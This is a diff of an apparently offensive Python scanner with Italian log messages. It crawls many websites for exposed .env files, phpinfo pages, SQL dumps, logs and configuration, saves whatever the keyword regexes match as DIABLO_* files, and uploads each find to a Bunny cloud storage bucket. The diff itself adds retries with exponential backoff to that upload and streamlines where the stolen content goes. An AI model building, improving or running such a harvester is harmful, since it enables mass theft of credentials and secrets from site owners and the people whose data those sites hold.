@@ -73,34 +73,53 @@ def claim_next_file_from_bunny(site_dir):
         
     return None
 
-def upload_file_to_bunny(local_path, remote_path):
-    #Carica un file locale nello storage di Bunny"""
+def upload_file_to_bunny(local_path, remote_path, max_retries=3):
     headers = {"AccessKey": BUNNY_API_KEY}
-    try:
-        print(f"[BUNNY UPLOAD] Inizio caricamento del file {local_path} verso {remote_path}...", flush=True)
-        with open(local_path, "rb") as f:
-            data = f.read()
-        url = f"{BUNNY_STORAGE_URL}/{remote_path}"
-        res = requests.put(url, headers=headers, data=data)
-        if res.status_code in [200, 201]:
-            print(f"[BUNNY UPLOAD] ✔️ Caricato su Bunny: {remote_path}", flush=True)
-        else:
-            print(f"[BUNNY UPLOAD] ❌ Errore upload {remote_path}: Status {res.status_code} - {res.text}", flush=True)
-    except Exception as e:
-        print(f"[BUNNY UPLOAD] ⚠️ Eccezione durante l'upload di {remote_path}: {str(e)}", flush=True)
+    url = f"{BUNNY_STORAGE_URL}/{remote_path}"
+    last_error = None
+    for attempt in range(max_retries):
+        try:
+            print(f"[BUNNY UPLOAD] Invio file {local_path} verso {remote_path} (tentativo {attempt+1}/{max_retries})...", flush=True)
+            with open(local_path, "rb") as f:
+                res = requests.put(url, headers=headers, data=f, timeout=30)
+            if res.status_code in [200, 201]:
+                print(f"[BUNNY UPLOAD] ✔️ Caricato su Bunny: {remote_path}", flush=True)
+                return True
+            elif res.status_code == 429:
+                wait = 2 ** attempt
+                print(f"[BUNNY UPLOAD] ⏳ Rate limited (429), retry tra {wait}s...", flush=True)
+                time.sleep(wait)
+                last_error = f"429 Rate Limited"
+            elif res.status_code >= 500:
+                wait = 2 ** attempt
+                print(f"[BUNNY UPLOAD] ⏳ Server error {res.status_code}, retry tra {wait}s...", flush=True)
+                time.sleep(wait)
+                last_error = f"Status {res.status_code} - {res.text}"
+            else:
+                print(f"[BUNNY UPLOAD] ❌ Errore upload {remote_path}: Status {res.status_code} - {res.text}", flush=True)
+                return False
+        except Exception as e:
+            last_error = str(e)
+            if attempt < max_retries - 1:
+                wait = 2 ** attempt
+                print(f"[BUNNY UPLOAD] ⚠️ Eccezione upload {remote_path}: {e}, retry tra {wait}s...", flush=True)
+                time.sleep(wait)
+            else:
+                print(f"[BUNNY UPLOAD] ❌ Upload FALLITO definitivamente {remote_path}: {e}", flush=True)
+    if last_error:
         with open(os.path.join('risultati', 'ERROR2.txt'), 'a', encoding='utf-8') as f:
-            f.write(f"Error uploading to Bunny Storage: {str(e)}\n")
+            f.write(f"Error uploading to Bunny Storage ({remote_path}): {last_error}\n")
+    return False
 
 def upload_results_to_bunny():
-   # """Carica tutta la cartella DIABLO-LOGV9 su Bunny Storage in risultati/"""
-    print("[BUNNY UPLOAD] Inizio caricamento cartella risultati su Bunny Storage...", flush=True)
-    for root, _, files in os.walk(result_dir):
+    print("[BUNNY UPLOAD] Inizio caricamento cartella DIABLO_FILES_SPLIT su Bunny Storage...", flush=True)
+    for root, _, files in os.walk(newpathtextract):
         for file in files:
             local_path = os.path.join(root, file)
-            rel_path = os.path.relpath(local_path, result_dir)
-            remote_path = f"risultati/{rel_path}".replace("\\", "/")
+            rel_path = os.path.relpath(local_path, newpathtextract)
+            remote_path = f"risultati/DIABLO_FILES_SPLIT/{rel_path}".replace("\\", "/")
             upload_file_to_bunny(local_path, remote_path)
-    print("[BUNNY UPLOAD] Caricamento risultati completato.", flush=True)
+    print("[BUNNY UPLOAD] Caricamento DIABLO_FILES_SPLIT completato.", flush=True)
 
 def delete_file_from_bunny(remote_path):
    # """Elimina un file dallo storage di Bunny"""
@@ -131,10 +150,6 @@ file_phpprofile = list(dict.fromkeys(config.get('file_phpprofile_shellscan', [])
 
 result_dir = 'risultati'
 newpathtextract = os.path.join(result_dir, 'DIABLO_FILES_SPLIT')
-myfile_checktmobileprv = os.path.join(result_dir, 'DIABLO_ENV.txt')
-myfile_checktmobilephp = os.path.join(result_dir, 'DIABLO_PHPINFO.txt')
-myfile_checktmobilephps = os.path.join(result_dir, 'DIABLO_ENV_NEW.txt')
-myfile_checkxml = os.path.join(result_dir, 'DIABLO_XML.txt')
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -507,15 +522,6 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                 is_php_file = any(x in url_lower for x in ['.php', 'phpinfo', 'view', '_profiler', 'info', '.cgi', '.sh', '.py', '.rb'])
                 is_html_content = "<html>" in contentsx.lower() or "<!doctype" in contentsx.lower()
                 
-                json_content_dict = None
-                if is_json_file:
-                    try:
-                        json_content_dict = json.loads(contentsx)
-                        with open(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'a', encoding='utf-8') as f:
-                            f.write(f'{json_content_dict}\n')
-                        upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'risultati/DIABLO_JSON.txt')
-                    except: pass
-                    
                 regex_found = False
                 for pattern in keyword_regexenv:
                     if "PHP Version" in pattern and not (is_php_file or is_html_content): continue
@@ -543,70 +549,36 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                         remote_subpath = None
                         
                         if is_json_file:
-                            with open(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link}  1\n')
                             saved_file_path = os.path.join(newpathtextract, f'DIABLO_JSON_{rnd_suffix}.txt')
                             with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_JSON_{rnd_suffix}.txt"
                         elif is_env_file:
-                            with open(myfile_checktmobilephps, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link}  2\n')
                             saved_file_path = os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt')
                             with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_NEW_{rnd_suffix}.txt"
                         elif url_lower.endswith('.js'):
-                            with open(os.path.join(result_dir, 'DIABLO_JS.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 3\n')
                             saved_file_path = os.path.join(newpathtextract, f'DIABLO_JS_{rnd_suffix}.txt')
                             with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_JS_{rnd_suffix}.txt"
                         elif url_lower.endswith('.xml'):
-                            with open(myfile_checkxml, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 4\n')
                             saved_file_path = os.path.join(newpathtextract, f'DIABLO_XML_{rnd_suffix}.txt')
                             with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_XML_{rnd_suffix}.txt"
                         elif url_lower.endswith('.log'):
-                            with open(os.path.join(result_dir, 'DIABLO_LOG.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 5\n')
                             saved_file_path = os.path.join(newpathtextract, f'DIABLO_LOG_{rnd_suffix}.txt')
                             with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_LOG_{rnd_suffix}.txt"
                         elif url_lower.endswith('.sql'):
-                            with open(os.path.join(result_dir, 'DIABLO_SQL.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 6\n')
                             saved_file_path = os.path.join(newpathtextract, f'DIABLO_SQL_{rnd_suffix}.txt')
                             with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_SQL_{rnd_suffix}.txt"
                         else:
-                            with open(os.path.join(result_dir, 'DIABLO_OTHER.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 7\n')
                             saved_file_path = os.path.join(newpathtextract, f'DIABLO_OTHER_{rnd_suffix}.txt')
                             with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_OTHER_{rnd_suffix}.txt"
                             
-                        # Carica in tempo reale il file su Bunny
                         if saved_file_path and remote_subpath:
                             upload_file_to_bunny(saved_file_path, remote_subpath)
-                            
-                        # Carica anche i file aggregati principali nella cartella risultati/
-                        if is_json_file:
-                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'risultati/DIABLO_JSON.txt')
-                        elif is_env_file:
-                            upload_file_to_bunny(myfile_checktmobilephps, 'risultati/DIABLO_ENV_NEW.txt')
-                        elif url_lower.endswith('.js'):
-                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_JS.txt'), 'risultati/DIABLO_JS.txt')
-                        elif url_lower.endswith('.xml'):
-                            upload_file_to_bunny(myfile_checkxml, 'risultati/DIABLO_XML.txt')
-                        elif url_lower.endswith('.log'):
-                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_LOG.txt'), 'risultati/DIABLO_LOG.txt')
-                        elif url_lower.endswith('.sql'):
-                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_SQL.txt'), 'risultati/DIABLO_SQL.txt')
-                        else:
-                            upload_file_to_bunny(os.path.join(result_dir, 'DIABLO_OTHER.txt'), 'risultati/DIABLO_OTHER.txt')
-                            
-                        # Carica sempre il file di recap env/host
-                        upload_file_to_bunny(myfile_checktmobileprv, 'risultati/DIABLO_ENV.txt')
                             
                     try:
                         html_content = r.text
@@ -629,16 +601,11 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                 if formatted_output:
                                     print(f"    [!] 🐘 TROVATO PHPINFO: {response_url}", flush=True)
                                     rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-                                    with open(myfile_checktmobilephp, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
-                                    with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 8\n')
                                     
                                     saved_php_path = os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix_php}.txt')
                                     with open(saved_php_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
                                     
-                                    # Carica in tempo reale il file su Bunny
                                     upload_file_to_bunny(saved_php_path, f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix_php}.txt")
-                                    upload_file_to_bunny(myfile_checktmobilephp, 'risultati/DIABLO_PHPINFO.txt')
-                                    upload_file_to_bunny(myfile_checktmobileprv, 'risultati/DIABLO_ENV.txt')
                     except: pass
                 try: r.close()
                 except: pass
